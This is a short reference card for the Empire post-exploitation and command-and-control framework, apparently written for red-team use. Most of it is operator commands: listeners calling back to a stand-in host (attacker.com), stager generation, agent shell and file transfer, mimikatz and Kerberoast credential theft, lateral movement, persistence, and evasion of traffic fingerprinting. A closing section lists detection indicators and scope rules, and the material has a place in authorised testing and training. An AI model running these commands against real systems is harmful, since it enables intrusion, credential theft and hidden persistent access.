# empire Toolcard

## Overview
- Summary: Empire is a PowerShell/Python/C#/Go post-exploitation and adversary emulation framework (BC-Security). Server/client architecture with multiplayer support, 400+ modules, integrated Starkiller web GUI. Supports HTTP/S, Malleable HTTP, OneDrive, Dropbox, and PHP listeners with Donut shellcode generation and built-in obfuscation (ConfuserEx, Invoke-Obfuscation). MITRE ATT&CK T1059 (Command & Scripting Interpreter), T1071 (Application Layer Protocol).

## Advanced Techniques
- Start server: `./ps-empire server` — start client: `./ps-empire client` — Starkiller GUI at `https://localhost:1337`.
- Create HTTP listener: `uselistener http` → `set Host http://attacker.com:8080` → `set Port 8080` → `execute`.
- HTTPS listener with cert: `uselistener http` → `set Host https://attacker.com:443` → `set CertPath /path/to/cert.pem` → `execute`.
- Generate stager: `usestager multi_launcher` → `set Listener mylistener` → `generate` — also: `windows_csharp_exe`, `windows_shellcode`, `multi_bash`, `macro`, `hta`.
- Interact with agent: `agents` → `interact <name>` → `shell whoami` — upload/download: `upload /tmp/tool.exe`, `download C:\loot.txt`.
- Set beacon timing: `sleep 60 30` (60s delay, 30% jitter) — blend with normal traffic patterns.
- Credential harvesting: `usemodule credentials/mimikatz/logonpasswords` (T1003), `usemodule credentials/invoke_kerberoast` (T1558.003).
- Lateral movement: `usemodule lateral_movement/invoke_psexec` (T1021.002), `usemodule lateral_movement/invoke_wmi` (T1047).
- Persistence: `usemodule persistence/elevated/schtasks` (T1053), `usemodule persistence/userland/registry` (T1547.001).
- .NET assembly & BOF execution: `usemodule code_execution/invoke_assembly`, `usemodule code_execution/invoke_bof` (T1620).
- Malleable HTTP profiles customize C2 traffic to mimic legitimate services — JA3/S and JARM evasion for TLS fingerprint avoidance.
- Detection indicators: unusual PowerShell execution, encoded command-line arguments, beaconing patterns to non-standard domains, high-entropy HTTP POST bodies.

## Safe Defaults
- Rate limits: set sleep/jitter appropriately for target environment (minimum 30s sleep recommended)
- Scope rules: explicit target only — change default API creds immediately after install (`empireadmin`/`password123`)

## Evidence Outputs
- outputs: evidence.json, findings.json, agent logs, credential dumps (as applicable)

## References
- https://github.com/BC-SECURITY/Empire
- https://bc-security.gitbook.io/empire-wiki/
- https://github.com/BC-SECURITY/Starkiller
